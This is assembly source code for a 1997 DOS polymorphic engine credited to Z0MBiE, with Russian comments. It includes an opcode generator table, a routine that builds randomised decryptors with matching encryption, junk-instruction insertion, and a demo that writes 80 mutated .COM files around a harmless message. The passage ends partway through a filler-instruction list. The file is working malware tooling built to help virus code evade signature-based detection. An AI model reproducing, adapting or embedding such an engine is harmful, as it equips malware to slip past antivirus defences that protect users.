
max             equ 6500

gen_cmd_32      macro cmd, r1,r2, im1,im2
                mov ax, cmd
                mov bx, r2 shl 8 + r1
                mov cx, im1
                mov dx, im2
                call add_opcode_32
                endm

gen_cmd         macro cmd, r1,r2, im1,im2
                mov ax, cmd
                mov bx, r2 shl 8 + r1
                mov cx, im1
                mov dx, im2
                call add_opcode
                endm

x               equ 0AAh
B               equ -1
W               equ -2

r_AX            equ 000B
r_CX            equ 001B
r_DX            equ 010B
r_BX            equ 011B
r_SP            equ 100B
r_BP            equ 101B
r_SI            equ 110B
r_DI            equ 111B

r_AL            equ 000B
r_CL            equ 001B
r_DL            equ 010B
r_BL            equ 011B
r_AH            equ 100B
r_CH            equ 101B
r_DH            equ 110B
r_BH            equ 111B

ir_SI           equ 00B
ir_DI           equ 01B
ir_BP           equ 10B
ir_BX           equ 11B

sr_ES           EQU 00B
sr_CS           EQU 01B
sr_SS           EQU 10B
sr_DS           EQU 11B

sr_FS           EQU 100B
sr_GS           EQU 101B


include         rulez.inc

                org 100h
start:

;                lea di, buf
;
;gen_cmd         xchg_r8_r8,   r_al,r_bh, 0,0
;gen_cmd         xchg_r16_r16, r_ax,r_di, 0,0
;
;                int 3
;                int 20h
;
;buf             db 100 dup (90h)

                mov cx, 80
@@1:            push cx

                lea si, incbyte
@@4:            inc byte ptr [si]
                cmp byte ptr [si], '9'
                jbe @@3
                mov byte ptr [si], '0'
                dec si
                jmp @@4
@@3:

                lea di, eof
                mov cx, 32768
                xor ax, ax
                rep stosb

                call create_decryptor

                mov ah, 3ch
                lea dx, filename
                xor cx, cx
                int 21h

                xchg bx, ax

                mov ah, 40h
                lea dx, decrypt_buf
                mov cx, max + 8192
                int 21h

                mov ah, 3eh
                int 21h

                mov al, '+'
                int 29h

                pop cx
                loop @@1

                int 20h

PE_start:

; ============= lo-level command generator ===================================

                ; input:
                ;   DI=куда класть команду
                ;   AX=опкод
                ;      AL:
                ;          bit 8     менять местами регистры
                ;          bit 7..0  номер опкода в таблице opcodes
                ;      AH=на что заXORить первый байт кода операции
                ;         чтоб получить другой опкод
                ;   BL=регистр 1
                ;   BH=регистр 2
                ;   CX/CL=данные 1
                ;   DX/DL=данные 2

error:          mov al, 7
                int 29h
                int 20h

add_opcode_32:  pusha

                mov byte ptr [di], 66h
                inc di
                jmp xxx

add_opcode:     pusha

xxx:            lea si, opcodes ; si = таблица опкодов

                movzx bp, al    ; bp = al and 127  - номер элемента таблицы
                and bp, 127
                jz add_opcode_si; 0 - всё

scan:           push cx ax      ; иначе сканируем таблицу до нашего элемента

@@3:            lodsb           ; берём биты в AL

                cmp al, -1
                je error

                test al, 80h    ; специально проверяем первый(7й) бит
                jz @@1          ; ибо если его нет, остальные биты
                                ; не отвечают за присутствие следующих байтов
                mov cx, 7

@@2:            shl al, 1       ; в соответствии с битами решаем,
                jnc @@4         ; есть ли соответствующие байты

                inc si
@@4:            loop @@2

                cmp al, 80h     ; проверка неиспользуемого бита
                jne error

@@1:            dec bp          ; и так пока не найдём наш элемент
                jnz @@3

                pop  ax cx

                ; здесь уже есть адрес элемента в SI,
                ; код команды в AX, есть bx, cx, dx

add_opcode_si:  test al, 128    ; cmd / cmdX
                jz @@1
                xor al, 128     ; если cmdX - меняем местами регистры
                xchg bl, bh

@@1:            mov bp, di

@@6:            lodsb           ; al=биты

                shl al, 1       ; есть опкод_1 ?
                jc @@5

                shr al, 1
                mov XOR_BYTE, al; нет. тогда-специальная феня

                ; пропускаем следующие однобайтовые записи

@@7:            test byte ptr [si], 80h  ; [si] = следующие биты
                jnz @@6
                inc si
                jmp @@7

@@5:            movsb           ; копируем и XORим опкод_1 на AH
                xor [di-1], ah

                mov ah, al      ; в AH будут биты

                shl ah, 1       ; есть опкод_2 ?
                jnc @@2

                lodsb           ; опкод 2
                xor al, 00h     ; специальная феня
LASTBYTE        XOR_BYTE
                stosb
                mov XOR_BYTE, 0

@@2:            shl ah, 1       ; опкод 3  (modr/m)
                jnc @@8

                movsb

@@8:            shl ah, 1
                jnc @@3

                lodsb           ; регистр 1
                xchg cx, ax
                shl bl, cl
                xchg cx, ax
                or [di-1], bl

@@3:            shl ah, 1
                jnc @@4

                lodsb           ; регистр 2
                xchg cx, ax
                shl bh, cl
                xchg cx, ax
                or [di-1], bh

@@4:            call @@add_bytes; данные 1

                mov cx, dx      ; данные 2

                call @@add_bytes; данные 2

                cmp ah, 80h     ; проверка неиспользуемого бита
                jne error

                MOV SAVE_DI, DI
                popa
                mov di, 1234h
LASTWORD        SAVE_DI
                ret

@@add_bytes:    shl ah, 1
                jnc @@exit

                lodsb
                cmp al, B
                je @@byte
                cmp al, W
                je @@word

                movzx bx, al
                bt word ptr [bp], bx
                jc @@word

@@byte:         mov al, cl
                stosb

@@exit:         ret

@@word:         xchg cx, ax     ; не меняем AH
                stosw
                xchg cx, ax

                cmp dword_id, 0
                je @@w
                dec dword_id

                xchg dx, ax
                stosw
                xchg dx, ax

@@w:            ret

dword_id        db 0

cmd             macro cmd_id, xorbits
                ifb <xorbits>
cmd_id          = cmd_num
                else
cmd_id          = cmd_num + (xorbits shl 8)
                endif
                endm

cmdX            macro cmd_id, xorbits
                ifb <xorbits>
cmd_id          = cmd_num + 128
                else
cmd_id          = cmd_num + 128 + (xorbits shl 8)
                endif
                endm

                ; там где (*) нельзя использовать ir=BP, а надо [BP+m]

                cmd_num = 0

nextcmd         macro
                cmd_num = cmd_num + 1
                endm

                ; формат записи (переменной длины)
                ; в таблице следующий:
                ; 1й байт    биты        (присутствует всегда)
                ;              бит 7   присутствует опкод1
                ;       если бит 7 = 0 то запись однобайтовая,
                ;       её биты 6..0 надо заксорить на 2й опкод следующей
                ;       не однобайтовой команды
                ;              бит 6   присутствует опкод2/modrm
                ;              бит 5   присутствует modrm
                ;              бит 4   присутствует reg1
                ;              бит 3   присутствует reg2
                ;              бит 2   присутствует data1
                ;              бит 1   присутствует data2
                ;              бит 0   1 (ДЛЯ ПРОВЕРКИ)
                ; 2й байт    опкод_1     (если бит 7 = 1)
                ; 3й байт    опкод_2     (если бит 6 = 1)
                ; 4й байт    modrm       (если бит 5 = 1)
                ; 5й байт    сдвиг_1     (если бит 4 = 1)
                ; 6й байт    сдвиг_2     (если бит 3 = 1)
                ;              сдвиги: на сколько битов влево сдвинуть
                ;                      регистр перед сложением с
                ;                      последним байтом кода операции
                ; 7й байт    данные_1    (если бит 2 = 1)
                ; 8й байт    данные_2    (если бит 1 = 1)
                ;              данные:
                ;                 B=добавить байт
                ;                 W=добавить слово
                ;             число=номер бита в WORD PTR опкод_1,
                ;                   в соответствии с которым
                ;                     0=добавить байт
                ;                     1=добавить слово

; <<<бывают глюки с командой TEST>>>
; test_r8_m    -  таких задолбанных команд НЕ СУЩЕСТВУЕТ
; test_r16_m

opcodes:

cmd             mov_r8_r8_a                        ; MOV r8, r8
cmd             mov_r16_r16_a,  1b                 ; MOV r16, r16
cmdX            mov_r8_r8_b,   10b                 ; MOV r8, r8
cmdX            mov_r16_r16_b, 11b                 ; MOV r16, r16
                DB 11011001b,  10001000B, 11000000B, 0, 3
                nextcmd

cmd             mov_r8_im8                         ; MOV r8, im8
cmd             mov_r16_im16, 1000b                ; MOV r16, im16
                DB 10010101b,  10110000B, 0, 3
                nextcmd

cmd             mov_r8_ir                          ; MOV r8, [ir1]      (*)
cmd             mov_sr_ir, 100b                    ; MOV sr, [ir1]      (*)
cmdX            mov_ir_r8,  10b                    ; MOV [ir1], r8      (*)
cmdX            mov_ir_sr, 110b                    ; MOV [ir1], sr      (*)
cmd             mov_r16_ir,  1b                    ; MOV r16, [ir1]     (*)
cmdX            mov_ir_r16, 11b                    ; MOV [ir1], r16     (*)
                DB 11011001b,  10001010B, 00000100B, 3, 0
                nextcmd

cmd             mov_r8_m                           ; MOV r8, [m16]
cmd             mov_sr_m, 100b                     ; MOV sr, [m16]
cmd             mov_m_r8   10b                     ; MOV [m16], r8
cmd             mov_m_sr, 110b                     ; MOV [m16], sr
cmd             mov_r16_m,  1b                     ; MOV r16, [m16]
cmd             mov_m_r16, 11b                     ; MOV [m16], r16
                DB 11010101b,  10001010B, 00000110B, 3, W
                nextcmd

cmd             mov_r_sr                           ; MOV r, sr
cmdX            mov_sr_r, 10b                      ; MOV sr, r
                DB 11011001b,  10001100b, 11000000b, 0, 3
                nextcmd

cmd             mov_r8_ir_m8                       ; MOV r8, [ir1+m8]
cmd             mov_sr_ir_m8, 100b                 ; MOV sr, [ir1+m8]
cmdX            mov_ir_m8_r8   10b                 ; MOV [ir1+m8], r8
cmdX            mov_ir_m8_sr, 110b                 ; MOV [ir1+m8], sr
cmd             mov_r16_ir_m8,  1b                 ; MOV r16, [ir1+m8]
cmdX            mov_ir_m8_r16, 11b                 ; MOV [ir1+m8], r16
                DB 11011101b,  10001010B, 01000100B, 3,0, B
                nextcmd


cmd             mov_r8_ir_m16                      ; MOV r8, [ir1+m16]
cmd             mov_sr_ir_m16, 100b                ; MOV sr, [ir1+m16]
cmdX            mov_ir_m16_r8,  10b                ; MOV [ir1+m16], r8
cmdX            mov_ir_m16_sr, 110b                ; MOV [ir1+m16], sr
cmd             mov_r16_ir_m16,  1b                ; MOV r16, [ir1+m16]
cmdX            mov_ir_m16_r16, 11b                ; MOV [ir1+m16], r16
                DB 11011101b,  10001010B, 10000100B, 3,0, W
                nextcmd

cmd             mov_m_im8                          ; MOV [m], im8
cmd             mov_m_im16, 1                      ; MOV [m], im16
                DB 11000111b,  11000110b, 00000110b, W,0
                nextcmd

cmd             mov_ir_m8_im8                      ; MOV [ir+m8], im8
cmd             mov_ir_m8_im16, 1                  ; MOV [ir+m8], im16
                DB 11010111b,  11000110b, 01000100b, 0, B, 0  ; 15
                nextcmd

cmd             mov_ir_im8                         ; MOV [ir], im8      (*)
cmd             mov_ir_im16, 1                     ; MOV [ir], im16     (*)
                DB 11010101b,  11000110b, 00000100b, 0, 0
                nextcmd

cmd             mov_ir_m16_im8                     ; MOV [ir+m16], im8
cmd             mov_ir_m16_im16, 1                 ; MOV [ir+m16], im16
                DB 11010111b,  11000110b, 10000100b, 0, W, 0  ; 15
                nextcmd

cmd             push_r                             ; PUSH r
cmd             pop_r, 1000b                       ; POP  r
                DB 10010001b,  01010000b, 0
                nextcmd

cmd             push_sr2                           ; PUSH sr2
cmd             pop_sr2, 1b                        ; POP  sr2
                DB 10010001b,  00000110B, 3
                nextcmd

cmd             push_sr3                           ; PUSH sr3  (FS/GS)
                DB 00000001B
                nextcmd

cmd             pop_sr3                            ; POP  sr3  (FS/GS)
                DB 11010001b,  00001111B, 10000001b, 3
                nextcmd

cmd             add_r8_r8                          ; ADD r8,  r8
cmd             add_r16_r16,      1b               ; ADD r16, r16
cmd             adc_r8_r8,    10000B               ; ADC r8,  r8
cmd             adc_r16_r16,  10001B               ; ADC r16, r16
cmd             sub_r8_r8,   101000B               ; SUB r8,  r8
cmd             sub_r16_r16, 101001B               ; SUB r16, r16
cmd             sbb_r8_r8,    11000B               ; SBB r8,  r8
cmd             sbb_r16_r16,  11001B               ; SBB r16, r16
cmd             and_r8_r8,   100000B               ; AND r8,  r8
cmd             and_r16_r16, 100001B               ; AND r16, r16
cmd             or_r8_r8,      1000B               ; OR  r8,  r8
cmd             or_r16_r16,    1001B               ; OR  r16, r16
cmd             xor_r8_r8,   110000B               ; XOR r8,  r8
cmd             xor_r16_r16, 110001B               ; XOR r16, r16
cmd             test_r8_r8,  10000100B             ; TEST r8, r8
cmd             test_r16_r16,10000101B             ; TEST r16,r16
cmd             cmp_r8_r8,   111000B               ; CMP r8,  r8
cmd             cmp_r16_r16, 111001B               ; CMP r16, r16
                DB 11011001b,   00000000B, 11000000b, 0,3
                nextcmd

cmd             add_r8_m,        10b               ; ADD r8,  [m]
cmd             add_r16_m,       11b               ; ADD r16, [m]
cmd             adc_r8_m,     10010B               ; ADC r8,  [m]
cmd             adc_r16_m,    10011B               ; ADC r16, [m]
cmd             sub_r8_m,    101010B               ; SUB r8,  [m]
cmd             sub_r16_m,   101011B               ; SUB r16, [m]
cmd             sbb_r8_m,     11010B               ; SBB r8,  [m]
cmd             sbb_r16_m,    11011B               ; SBB r16, [m]
cmd             and_r8_m,    100010B               ; AND r8,  [m]
cmd             and_r16_m,   100011B               ; AND r16, [m]
cmd             or_r8_m,       1010B               ; OR  r8,  [m]
cmd             or_r16_m,      1011B               ; OR  r16, [m]
cmd             xor_r8_m,    110010B               ; XOR r8,  [m]
cmd             xor_r16_m,   110011B               ; XOR r16, [m]
cmd             cmp_r8_m,    111010B               ; CMP r8,  [m]
cmd             cmp_r16_m,   111011B               ; CMP r16, [m]
cmd             add_m_r8,        00b               ; ADD [m], r8
cmd             add_m_r16,       01b               ; ADD [m], r16
cmd             adc_m_r8,     10000B               ; ADC [m], r8
cmd             adc_m_r16,    10001B               ; ADC [m], r16
cmd             sub_m_r8,    101000B               ; SUB [m], r8
cmd             sub_m_r16,   101001B               ; SUB [m], r16
cmd             sbb_m_r8,     11000B               ; SBB [m], r8
cmd             sbb_m_r16,    11001B               ; SBB [m], r16
cmd             and_m_r8,    100000B               ; AND [m], r8
cmd             and_m_r16,   100001B               ; AND [m], r16
cmd             or_m_r8,       1000B               ; OR  [m], r8
cmd             or_m_r16,      1001B               ; OR  [m], r16
cmd             xor_m_r8,    110000B               ; XOR [m], r8
cmd             xor_m_r16,   110001B               ; XOR [m], r16
cmd             test_m_r8, 10000100B               ; TEST [m], r8
cmd             test_m_r16,10000101B               ; TEST [m], r16
cmd             cmp_m_r8,    111000B               ; CMP [m], r8
cmd             cmp_m_r16,   111001B               ; CMP [m], r16
                DB 11010101b,   00000000B, 00000110b, 3, W
                nextcmd




cmd             adc_m_im8                          ; ADC [m], im8
cmd             adc_m_im16, 1                      ; ADC [m], im16
                DB 00010000B
                nextcmd

cmd             sub_m_im8                          ; SUB [m], im8
cmd             sub_m_im16, 1                      ; SUB [m], im16
                DB 00101000B
                nextcmd

cmd             sbb_m_im8                          ; SBB [m], im8
cmd             sbb_m_im16, 1                      ; SBB [m], im16
                DB 00011000B
                nextcmd

cmd             and_m_im8                          ; AND [m], im8
cmd             and_m_im16, 1                      ; AND [m], im16
                DB 00100000B
                nextcmd

cmd             xor_m_im8                          ; XOR [m], im8
cmd             xor_m_im16, 1                      ; XOR [m], im16
                DB 00110000B
                nextcmd

cmd             or_m_im8                           ; OR  [m], im8
cmd             or_m_im16, 1                       ; OR  [m], im16
                DB 00001000B
                nextcmd

cmd             cmp_m_im8                          ; CMP [m], im8
cmd             cmp_m_im16, 1                      ; CMP [m], im16
                DB 00111000B
                nextcmd

cmd             add_m_im8                          ; ADD [m], im8
cmd             add_m_im16, 1                      ; ADD [m], im16
                DB 11000111b,   10000000B, 00000110b, W,0
                nextcmd



cmd             test_m_im8                         ; TEST [m], im8
cmd             test_m_im16, 1                     ; TEST [m], im16
                DB 11000111b,   11110110B, 00000110b, W,0
                nextcmd

cmd             xchg_r8_r8                         ; XCHG r8, r8
cmd             xchg_r16_r16, 1                    ; XCHG r16, r16
                DB 11011001b,   10000110B, 11000000B, 3,0
                nextcmd

cmd             inc_r16                            ; INC r16
cmd             dec_r16, 1000B                     ; DEC r16
                DB 10010001b,   01000000b, 0
                nextcmd

cmd             inc_r8                             ; INC r8
                DB 00001000B
                nextcmd

cmd             dec_r8                             ; DEC r8
                DB 11010001b,   11111110b, 11001000B, 0
                nextcmd

cmd             not_r8                             ; NOT r8
cmd             not_r16, 1                         ; NOT r16
                DB 00001000B
                nextcmd

cmd             neg_r8                             ; NEG r8
cmd             neg_r16, 1                         ; NEG r16
                DB 11010001b,   11110110B, 11011000B, 0
                nextcmd

cmd             rol_r8_1                           ; ROL r8, 1
cmd             rol_r8_cl, 10b                     ; ROL r8, CL
cmd             rol_r16_1, 1b                      ; ROL r16, 1
cmd             rol_r16_cl, 11b                    ; ROL r16, CL
                DB 00001000B
                nextcmd

cmd             ror_r8_1                           ; ROR r8, 1
cmd             ror_r8_cl, 10b                     ; ROR r8, CL
cmd             ror_r16_1, 1b                      ; ROR r16, 1
cmd             ror_r16_cl, 11b                    ; ROR r16, CL
                DB 11010001b,   11010000B, 11001000B, 0
                nextcmd

cmd             ror_r8_im                          ; ROR r8, im
cmd             ror_r16_im, 1                      ; ROR r8, im
                DB 00001000B
                nextcmd

cmd             rol_r8_im                          ; ROL r8, im
cmd             rol_r16_im, 1                      ; ROL r8, im
                DB 11010101b,   11000000b, 11000000b, 0, B
                nextcmd

cmd             adc_r8_im8                          ; ADC r8,  im8
cmd             adc_r16_im16, 1                     ; ADC r16, im16
                DB 00010000B
                nextcmd

cmd             sub_r8_im8                          ; SUB r8,  im8
cmd             sub_r16_im16, 1                     ; SUB r16, im16
                DB 00101000B
                nextcmd

cmd             sbb_r8_im8                          ; SBB r8,  im8
cmd             sbb_r16_im16, 1                     ; SBB r16, im16
                DB 00011000B
                nextcmd

cmd             and_r8_im8                          ; AND r8,  im8
cmd             and_r16_im16, 1                     ; AND r16, im16
                DB 00100000B
                nextcmd

cmd             or_r8_im8                           ; OR  r8,  im8
cmd             or_r16_im16, 1                      ; OR  r16, im16
                DB 00001000B
                nextcmd

cmd             xor_r8_im8                          ; XOR r8,  im8
cmd             xor_r16_im16, 1                     ; XOR r16, im16
                DB 00110000B
                nextcmd

cmd             cmp_r8_im8                          ; CMP r8,  im8
cmd             cmp_r16_im16, 1                     ; CMP r16, im16
                DB 00111000B
                nextcmd

cmd             add_r8_im8                          ; ADD r8,  im8
cmd             add_r16_im16, 1                     ; ADD r16, im16
cmd             test_r8_im8,   1110110B             ; TEST r8, im8
cmd             test_r16_im16, 1110111B             ; TEST r16,im16
                DB 11010101b,   10000000B, 11000000b, 0, 0
                nextcmd

cmd             btc_r16_r16                         ; BTC r16, r16
                DB 11111001b,   00001111b, 10111011b, 11000000b, 0,3
                nextcmd

cmd             btc_r16_im                          ; BTC r16, im
                DB 11110101b,   00001111b, 10111010b, 11111000b, 0,B
                nextcmd

cmd             push_ir_m8                          ; PUSH [ir+im8]
                DB 11010101b,   11111111b, 01110100b, 0, B
                nextcmd

cmd             pop_ir_m8                           ; POP  [ir+im8]
                DB 11010101b,   10001111b, 01000100b, 0, B
                nextcmd

cmd             xchg_r8_r8                          ; XCHG r8, r8
cmd             xchg_r16_r16, 1b                    ; XCHG r16, r16
                DB 11011001b,   10000110B, 11000000b, 3,0
                nextcmd

cmd             lea_bx_bx_b                        ; LEA BX, [BX+xx]
                DB 11000101b,   8DH,5FH, B
                nextcmd
cmd             lea_bx_bx_w                        ; LEA BX, [BX+xxxx]
                DB 11000101b,   8DH,9FH, W
                nextcmd

cmd             lea_si_si_b                        ; LEA SI, [SI+xx]
                DB 11000101b,   8DH,74H, B
                nextcmd
cmd             lea_si_si_w                        ; LEA SI, [SI+xxxx]
                DB 11000101b,   8DH,0B4H, W
                nextcmd

cmd             lea_di_di_b                        ; LEA DI, [DI+xx]
                DB 11000101b,   8DH,7DH, B
                nextcmd
cmd             lea_di_di_w                        ; LEA DI, [DI+xxxx]
                DB 11000101b,   8DH,0BDH, W
                nextcmd

cmd             lea_bp_bp_b                        ; LEA BP, [BP+xx]
                DB 11000101b,   8DH,6EH, B
                nextcmd
cmd             lea_bp_bp_w                        ; LEA BP, [BP+xxxx]
                DB 11000101b,   8DH,0AEH, W
                nextcmd

                ;;

                DB -1

; ============= hi-level command generator ==================================

c1              db -1,-1    ; что не должно быть в reg_1
                db -1,-1    ; что не должно быть в reg_2
                dw c1_size  ; сколько опкодов
                dw add_r8_r8, sub_r8_r8
                dw xor_r8_r8, xor_r8_r8
                dw inc_r8, dec_r8
                dw not_r8, not_r8
                dw neg_r8, neg_r8
                dw rol_r8_1, ror_r8_1
                dw rol_r8_im, ror_r8_im
                dw xchg_r8_r8, xchg_r8_r8
c1_size         equ ($-c1-6)/2

c2              db r_sp,-1
                db r_sp,-1
                dw c2_size
                dw add_r16_r16, sub_r16_r16
                dw xor_r16_r16, xor_r16_r16
                dw btc_r16_r16, btc_r16_r16     ; !!!
                dw xchg_r16_r16, xchg_r16_r16
c2_size         equ ($-c2-6)/2

c3              db r_sp,-1
                db -1,-1
                dw c3_size
                dw inc_r16, dec_r16
                dw not_r16, not_r16
                dw neg_r16, neg_r16
                dw rol_r16_1, ror_r16_1
                dw rol_r16_im, ror_r16_im
                dw btc_r16_im, btc_r16_im       ; !!!
c3_size         equ ($-c3-6)/2

c4              db r_cl,-1
                db -1,-1
                dw c4_size
                dw rol_r8_cl, ror_r8_cl
c4_size         equ ($-c4-6)/2

c5:             db r_cx, r_sp
                db -1,-1
                dw c5_size
                dw rol_r16_cl, ror_r16_cl
c5_size         equ ($-c5-6)/2

                ; [m]

c6:             db -1,-1
                db -1,-1
                dw c6_size
                dw add_r8_im8, sub_r8_im8
                dw xor_r8_im8, xor_r8_im8
c6_size         equ ($-c6-6)/2

c7:             db r_sp,-1
                db -1,-1
                dw c7_size
                dw add_r16_im16, sub_r16_im16
                dw xor_r16_im16, xor_r16_im16
c7_size         equ ($-c7-6)/2

c7b:            db -1,-1
                db -1,-1
                dw c7b_size
                dw lea_bx_bx_b, lea_bx_bx_b
                dw lea_si_si_b, lea_si_si_b
                dw lea_di_di_b, lea_di_di_b
                dw lea_bp_bp_b, lea_bp_bp_b

                dw 2 dup (cmp_m_im8)
                dw 2 dup (test_m_im8)
                dw 2 dup (cmp_r8_im8)
                dw 2 dup (test_r8_im8)

c7b_size        equ ($-c7b-6)/2

c7w:            db -1,-1
                db -1,-1
                dw c7w_size
                dw lea_bx_bx_w, lea_bx_bx_w
                dw lea_si_si_w, lea_si_si_w
                dw lea_di_di_w, lea_di_di_w
                dw lea_bp_bp_w, lea_bp_bp_w
c7w_size        equ ($-c7w-6)/2

c8:             db -1,-1
                db -1,-1
                dw c8_size

                dw add_r8_m, sub_r8_m
                dw xor_r8_m, xor_r8_m

                dw 2 dup (cmp_m_im16)
                dw 2 dup (test_m_im16)

                dw 2 dup (cmp_r16_im16)
                dw 2 dup (test_r16_im16)

c8_size         equ ($-c8-6)/2

c9:             db r_sp,-1
                db -1,-1
                dw c9_size
                dw add_r16_m, sub_r16_m
                dw xor_r16_m, xor_r16_m
c9_size         equ ($-c9-6)/2

c10:            db -1,-1
                db -1,-1
                dw c10_size

                dw 2 dup (cmp_r8_r8)
                dw 2 dup (test_r8_r8)
                dw 2 dup (cmp_r16_r16)
                dw 2 dup (test_r16_r16)

                dw 2 dup (cmp_m_r8)
                dw 2 dup (test_m_r8)
                dw 2 dup (cmp_m_r16)
                dw 2 dup (test_m_r16)

c10_size        equ ($-c10-6)/2

c_ptr           dw c1,c2,c3,c4, c5,c6,c7, c7b,c7w, c8,c9, c10
c_size          equ ($-c_ptr)/2



get_cmd_id:     mov ax, c_size
                call rnd
                shl ax, 1
                xchg si, ax
                mov si, c_ptr[si]

                mov grp, si

                mov bx, -1

                cmp prefix, 0
                je check89

                cmp si, offset c7b
                je @@0
                cmp si, offset c7w
                je @@0

                cmp si, offset c6
                jne @@1

@@0:            mov prefix, 0
                jmp check89

@@1:            cmp si, offset c7
                jne @@2
                add dword_id, 2

@@2:

check89:        cmp si, offset c8
                je @@8
                cmp si, offset c9
                je @@9

                jmp @@1

@@8:            mov prefix, 0  ; c8

@@9:            mov ax, cx     ; чтобы [m] не вылезал за границу декриптора
                xor dx, dx
                mov cx, MAX - 4
                div cx
                mov cx, dx

                add offset_id, 2   ; не забудем потом скорректировать [m]
@@1:

get_regs:       call random        ; reg_1 <> reg_2
                and ax, 0707h

                cmp al, bl
                je get_regs
                cmp al, ah
                je get_regs

                xchg bx, ax

                cmp bl, [si+0]
                je get_regs
                cmp bl, [si+1]
                je get_regs

                cmp bh, [si+2]
                je get_regs
                cmp bh, [si+3]
                je get_regs

                lodsw  ; add si, 4
                lodsw

                lodsw  ; ax = c?_size
                call rnd
                shl ax, 1

                push bp
                xchg bp, ax
                mov ax, [si+bp]
                xor bp, 2
                mov si, [si+bp]
                pop bp


                ret

code_start      DW ?

                ; структура декриптора:
                ;
                ;        CLI
                ;        MOV SP, code_start
                ; @@1:   POP EAX  ; все кроме ESP, 7 DWORDов, 28 байт
                ;        ...      ; порядок следования регистров-рандомный
                ;        POP EBP
                ;        <сгенерённая перемешивалка значений>
                ;        PUSH EBP
                ;        ...
                ;        PUSH EAX
                ;        INC EAX       ; EAX = -1
                ;        JZ @@2
                ;        JMP @@1
                ; @@2:   JMP code_entry_point

create_decryptor:
                mov bx, 100h

                ; bx=decryptor offset
                mov decr_offs, bx
                LEA AX, [BX + MAX]
                MOV CODE_START, AX

                call sort_1

                lea di, decrypt_buf        ; в DI: с начала в конец

                lea bp, encrypt_buf + max - 1    ; в BP: с конца в начало  :)
                mov byte ptr [bp], 0C3h  ; RET

                call musor

                MOV AL, 0FAH    ; CLI
                STOSB

                call musor

                MOV AL, 0BCH    ; MOV SP, offset code_start
                STOSB
                MOV AX, code_start
                STOSW

                call musor

                mov save_di_1, di

                lea si, cmd_2 + 6 * 2
                call proc_1

                call make_decr

                lea si, cmd_1 + 6 * 2
                call proc_1

                call musor

                mov ax, 0C483h  ; add sp, 28
                stosw
                mov al, 28
                stosb

                call musor

                MOV AX, 4066H   ; INC EAX
                STOSW

                call musor

                MOV AX, 0374H   ; JZ $+2+3
                STOSW

                MOV AL, 0E9H    ; jmp @@1
                STOSB
                LEA AX, [DI+2]
                SUB AX, 1234h
lastword        save_di_1
                NEG AX
                STOSW

                call musor

                MOV AL, 0E9H    ; jmp code_entry_point
                STOSB
                LEA AX, [di+2]
                sub ax, offset decrypt_buf + max
                neg ax
                add ax, sux_entry_point - sux_start
                stosw

                ; *********************

                sub bp, offset save_encr + 2
                mov save_encr, bp
                mov save_sp, sp

                CLI

                mov sp_1, offset sux_start
                mov sp_2, offset decrypt_buf + MAX + 28

encrypt:        DB 0BCH
sp_1            dw ?
                add sp_1, 28

cmd_1           label word
                pop eax
                pop ebx
                pop ecx
                pop edx
                pop esi
                pop edi
                pop ebp

                mov sp, save_sp

                db 0E8h
save_encr       dw ?

                db 0BCh
sp_2            dw ?
                add sp_2, 28

cmd_2           label word
                push edi
                push esi
                push edx
                push ecx
                push ebx
                push eax
                push ebp

                db 0BCH
save_sp         dw ?

                cmp sp_1, offset sux_end
                jbe encrypt

                STI

                ret

correct_offset: cmp offset_id, 0
                je @@1
                dec offset_id

                add word ptr [di-2], 1234h
lastword        correct_word

@@1:            ret

offset_id       db 0

; ---------------------------------------------------------------------------

                align 28

sux_start:      db 'PE 0.02, Polimorphic Engine  (c)`97 Z0MBiE, file '

filename        db '0000.com',0
incbyte         equ byte ptr $-6

                db 13,10,'$'


sux_entry_point:XOR SP, SP
                STI

                MOV AH, 9
                MOV DX, 100H + MAX
                MVE DS, CS
                INT 21H

                MOV AX, 4C00H
                INT 21H

                align 28
                dd 14 dup (-1)
sux_end:

; ---------------------------------------------------------------------------

proc_1:         mov cx, 7
@@1:            mov ax, [si]
                dec si
                dec si
                xor ah, 8       ; PUSH/POP

                stosw

                call musor

                loop @@1
                ret



sort_1:         lea bx, cmd_1
                call sort_2

                lea bx, cmd_2

sort_2:         mov cx, 100

@@1:            mov ax, 7
                call rnd
                shl ax, 1
                xchg si, ax

                mov ax, 7
                call rnd
                shl ax, 1
                xchg di, ax

                mov ax, [bx][si]
                xchg ax, [bx][di]
                mov [bx][si], ax

                loop @@1
                ret



min_cmd         EQU 300
max_cmd         EQU 400

make_decr:      mov ax, max_cmd-min_cmd
                call rnd
                add ax, min_cmd
                xchg cx, ax

@@1:            push cx

                call musor

                call random
                and ax, 1
                imul ax, 66h
                mov prefix, al  ; 32bit prefix

@@x:            call random     ; cx=data_1
                xchg cx, ax

                ; Э Т О   О Х У И Т Е Л Ь Н О

                cmp cl, 80h
                je @@x
                cmp cx, 8000h
                je @@x

                ; это тоже
                cmp cx, 0fff0h
                ja @@x


                call random     ; dx=data_2
                xchg dx, ax

                call get_cmd_id ; ax=cmd_id, si=cmd_id^-1, bl,bh=regs

                push ax
                mov al, prefix
                or al, al
                jz @@4
                stosb
@@4:            pop ax

                add bp, di

                call add_opcode ; -> DI

                mov correct_word, 1234h ; по какому офсету будет декриптор
LASTWORD        DECR_OFFS
                call correct_offset

                sub bp, di

                mov ax, 1234h
LASTWORD        GRP
                cmp ax, offset c7b
                jne @@a
                neg cl
@@a:
                cmp ax, offset c7w
                jne @@b
                neg cx
@@b:

                mov ax, si

                push di
                mov di, bp

                call add_opcode ; -> BP

                mov correct_word, offset decrypt_buf
                call correct_offset

                pop di

                mov al, 00h
LASTBYTE        PREFIX
                or al, al
                jz @@3
                sub prefix, al
                dec bp
                mov [bp], al    ; prefix

@@3:            pop cx
                loop @@1

                ret

; ---------------------------------------------------------------------------

musor:          pusha

                call __musor__

                mov s_di, di
                popa

                mov di, 1234h
lastword        s_di

                ret

__musor__:      call scan_space
                cmp cx, 40
                jb gen_jmp

                mov ax, 10
                call rnd

                dec ax
                jz gen_short_jmp

                dec ax
                jz gen_1byte

                dec ax
                jz gen_2byte

                dec ax
                jz gen_jmp

                ret

cmd1byte        label byte
                NOP
                CLC
                STC
                CMC
                CLI
                SEGCS
                SEGSS
                REPZ
                REPNZ
cmd1byte_size   equ $-cmd1byte

gen_1byte:      mov ax, cmd1byte_size
                call rnd
                xchg si, ax
                mov al, cmd1byte[si]
                stosb
                ret

cmd2byte        label word
                F2XM1
                FABS
                FADD
                FADDP
                FCHS
                FNCLEX
                FCOM
                FCOMP
                FCOMPP
                FCOS
                FDECSTP
                FDIV
                FDIVP
                FDIVR
                FDIVRP
                FFREE
                FINCSTP
                FLD1
                FLDL2T
                FLDL2E
                FLDPI
                FLDLN2
                FLDZ
                FMUL
                FMULP
